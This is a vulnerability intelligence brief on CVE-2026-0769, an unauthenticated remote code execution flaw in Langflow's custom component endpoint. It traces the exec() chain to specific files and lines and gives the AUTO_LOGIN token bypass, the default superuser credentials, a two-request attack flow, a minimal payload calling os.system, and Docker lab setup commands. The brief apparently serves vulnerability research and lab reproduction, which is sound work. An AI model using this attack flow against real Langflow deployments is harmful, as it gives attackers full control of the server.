# Intel Brief: CVE-2026-0769

## CVE Overview

| Field | Value |
|---|---|
| **CVE ID** | CVE-2026-0769 |
| **Title** | Langflow eval_custom_component_code Eval Injection Remote Code Execution |
| **Affected Software** | Langflow |
| **Vendor** | langflow-ai |
| **CVSS Score** | 9.8 CRITICAL |
| **CVSS Vector** | CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| **CWE** | CWE-95 (Improper Neutralization of Directives in Dynamically Evaluated Code / Eval Injection) |
| **EPSS** | 1.1% (77.5th percentile) |
| **Published** | 2026-01-23 |
| **Researcher** | Peter Girnus (@gothburz), Trend Micro Zero Day Initiative |
| **ZDI ID** | ZDI-26-035 (ZDI-CAN-26972) |
| **GHSA ID** | GHSA-5v3c-9g74-93w7 |

## Description

Langflow contains a critical Remote Code Execution (RCE) vulnerability in the `eval_custom_component_code` function. The vulnerability allows remote attackers to execute arbitrary Python code on affected installations without authentication (in the default configuration where `AUTO_LOGIN=True`).

The specific flaw exists in the `create_class()` function within `langflow/utils/validate.py`. User-supplied Python code is passed directly to Python's `exec()` builtin without any sandboxing, input validation, or restriction on what operations can be performed. The code is received via HTTP API endpoints that accept custom component code.

**This is a 0-day vulnerability.** ZDI reported it to the vendor on July 18, 2025. After multiple follow-ups (September 11, October 10, December 10, 2025) with no fix from the vendor, ZDI published the advisory on January 9, 2026. **No patch exists as of the latest release (v1.8.0).** The ZDI advisory recommends restricting interaction with the product as the only mitigation.

## Affected Versions

- **All versions from at least 1.0.0 through 1.8.0 (latest)** are affected
- The EIP lists `1.3.2` as the confirmed affected version
- The vulnerability exists in the fundamental code execution mechanism and has never been patched
- In v1.5+, the code was refactored from `langflow.utils.validate` to `lfx.custom.validate`, but the vulnerability persists identically

## Repository Information

| Field | Value |
|---|---|
| **Repository URL** | https://github.com/langflow-ai/langflow.git |
| **Vulnerable Version (checked out)** | `1.3.2` (tag) — commit `8e31fc5a8acf02894b01d13ce8e79126654fe692` |
| **Fix Commit** | **NONE — 0-day, no fix exists** |
| **Patched Version** | **NONE — vulnerability present through v1.8.0** |

## Vulnerability Details

### Root Cause

The vulnerability chain:

1. **API Entry Points** receive user-supplied Python code as a string:
   - `POST /api/v1/custom_component` — `CustomComponentRequest.code` field
   - `POST /api/v1/custom_component/update` — `UpdateCustomComponentRequest.code` field

2. **`eval_custom_component_code(code)`** in `langflow/custom/eval.py` (line 9-12):
   ```python
   def eval_custom_component_code(code: str) -> type["CustomComponent"]:
       class_name = validate.extract_class_name(code)
       return validate.create_class(code, class_name)
   ```

3. **`validate.create_class(code, class_name)`** in `langflow/utils/validate.py` (line 172):
   - Prepends `DEFAULT_IMPORT_STRING` to user code
   - Parses with `ast.parse()` (only syntactic validation)
   - Calls `prepare_global_scope()` which uses `exec()` on definitions at line 293
   - Calls `build_class_constructor()` which uses `exec()` at line 338

4. **No sandboxing, code validation, or restriction** is applied at any point. The user code runs with full privileges of the Langflow backend process.

### Vulnerable Files (v1.3.2)

| File | Function | Line | Issue |
|---|---|---|---|
| `src/backend/base/langflow/custom/eval.py` | `eval_custom_component_code()` | 9-12 | Entry point, no validation |
| `src/backend/base/langflow/utils/validate.py` | `create_class()` | 172-216 | Orchestrates code execution |
| `src/backend/base/langflow/utils/validate.py` | `prepare_global_scope()` | 232-295 | `exec()` on definitions (line 293) |
| `src/backend/base/langflow/utils/validate.py` | `build_class_constructor()` | 326-349 | `exec()` on class code (line 338) |
| `src/backend/base/langflow/api/v1/endpoints.py` | `custom_component()` | 653-672 | API endpoint receiving code |
| `src/backend/base/langflow/api/v1/endpoints.py` | `custom_component_update()` | 675-740 | API endpoint receiving code |

### Authentication Bypass

- `AUTO_LOGIN` is set to `True` by default in `langflow/services/settings/auth.py` (line 32)
- When AUTO_LOGIN is enabled, `GET /api/v1/auto_login` returns a valid access token with no credentials required
- A default superuser is automatically created with credentials `langflow`:`langflow` (defined in `services/settings/constants.py`)
- This means in default deployments, the vulnerability is exploitable without any real credentials
- The `/api/v1/auto_login` endpoint itself requires no authentication

### Attack Flow

```
1. GET /api/v1/auto_login
   → Returns {"access_token": "...", "refresh_token": "...", "token_type": "bearer"}
   → Also sets access_token_lf cookie

2. POST /api/v1/custom_component
   Headers: Authorization: Bearer <access_token>
   Content-Type: application/json
   Body: {"code": "<malicious_python_code>"}
   → Malicious code is exec()'d on the server
```

### Malicious Code Requirements

The injected code must contain a class that inherits from `Component` (or any class with "Component" or "LC" in its base class name) to pass `extract_class_name()`. However, arbitrary code can be placed:
- In module-level statements (executed by `prepare_global_scope()` via `exec()`)
- In the class body (executed by `build_class_constructor()` via `exec()`)
- In import-level side effects

Example minimal payload structure:
```python
import os
os.system("id")

from langflow.custom import Component
from langflow.io import Output

class MaliciousComponent(Component):
    display_name = "Test"
    outputs = [Output(name="output", display_name="Output", method="run")]
    def run(self):
        pass
```

## Build System

| Field | Value |
|---|---|
| **Language** | Python 3.10-3.13 |
| **Build System** | hatchling (pyproject.toml) |
| **Package Manager** | pip / uv |
| **Workspace Structure** | Monorepo: `langflow` (root) + `langflow-base` (src/backend/base) |
| **Frontend** | Node.js (npm) — React/Vite (not needed for PoC) |
| **Docker Base Image** | `python:3.12.3-slim` (runtime) |
| **Default Port** | 7860 |
| **Default Host** | 0.0.0.0 |
| **Start Command** | `langflow run` |

### Key Dependencies

- `fastapi>=0.115.2` — Web framework (API server)
- `uvicorn>=0.30.0` — ASGI server
- `langchain~=0.3.10` — LLM framework
- `pydantic~=2.10.1` — Data validation
- `sqlmodel==0.0.22` — Database ORM (SQLite by default)
- `python-jose>=3.3.0` — JWT tokens
- `passlib>=1.7.4` — Password hashing
- `bcrypt==4.0.1` — Password hashing backend
- `langflow-base==0.3.2` — Core backend package (contains the vulnerable code)

### Simplest Lab Setup

The easiest approach for lab reproduction:
1. **Docker Image**: `langflowai/langflow:1.3.2` is available on Docker Hub (amd64 + arm64)
2. **pip install**: `pip install langflow==1.3.2` is available on PyPI
3. Default configuration with AUTO_LOGIN=True requires no additional setup

```bash
# Option 1: Docker (recommended for lab)
docker run -d -p 7860:7860 --name langflow langflowai/langflow:1.3.2

# Option 2: pip
pip install langflow==1.3.2
langflow run --host 0.0.0.0 --port 7860
```

## Public Exploits

**No public exploits exist.** No Metasploit modules, ExploitDB entries, GitHub PoCs, or Nuclei templates were found for this CVE. This is expected given the recent 0-day disclosure (ZDI-26-035).

## References

| Type | URL |
|---|---|
| ZDI Advisory | https://www.zerodayinitiative.com/advisories/ZDI-26-035/ |
| GHSA | https://github.com/advisories/GHSA-5v3c-9g74-93w7 |
| NVD | https://nvd.nist.gov/vuln/detail/CVE-2026-0769 |
| Source Repository | https://github.com/langflow-ai/langflow |
| PyPI Package | https://pypi.org/project/langflow/1.3.2/ |
| Docker Image | https://hub.docker.com/r/langflowai/langflow/tags?name=1.3.2 |
